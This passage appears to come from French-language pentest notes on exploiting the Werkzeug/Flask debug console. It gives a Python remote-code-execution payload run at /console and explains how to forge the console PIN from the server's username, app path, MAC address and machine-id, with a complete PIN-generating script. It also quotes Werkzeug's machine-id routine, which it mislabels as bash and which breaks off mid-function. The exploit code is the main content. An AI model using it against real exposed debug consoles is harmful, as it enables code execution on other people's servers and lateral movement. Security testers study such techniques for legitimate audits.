```
http://domain.com/console
```

### RCE :

```python
__import__('os').popen('whoami').read();
```

Si la console est protégée par un PIN, ça se complique :). Il est possible de générer le code PIN si nous avons déjà un accès à la machine (ce qui peut permettre du lateral movement).

### Pour générer le PIN, plusieurs informations sont nécessaires:

- ```username``` qui a initié l'application.
- ``modname`` (flask.app, la plupart du temps).
- ``getattr(mod, '__file__', None)`` le path vers app.py (/usr/local/lib/python3.5/dist-packages/flask/app.py , par exemple).
- ``getattr(app, '__name__', getattr(app.__class__, '__name__'))`` généralement "Flask".
- ``uuid.getnode()`` est l'adresse MAC de l'interface réseau du serveur, sous forme décimale. Pour la trouver : ``/sys/class/net/<device id>/address`` puis la convertir sous forme décimale, par exemple avec python (exemple : ``print(0x5600027a23ac)``)
- ``get_machine_id()`` : trouvable avec ce script bash :

```bash
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
```

Puis remplir ce script python avec toutes les informations trouvées :

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

Une fois exécuté, le script devrait générer un code PIN valide pour l'accès à la console de werkzeug.

> [!Attention] 
> Plusieurs méthodes différentes existent pour trouver ces variables, et ne donnent pas le même résultat final, il peut être nécessaire de tester plusieurs fois. Aussi, la console de debug peut se locker après un certain nombre d'essais, attention !


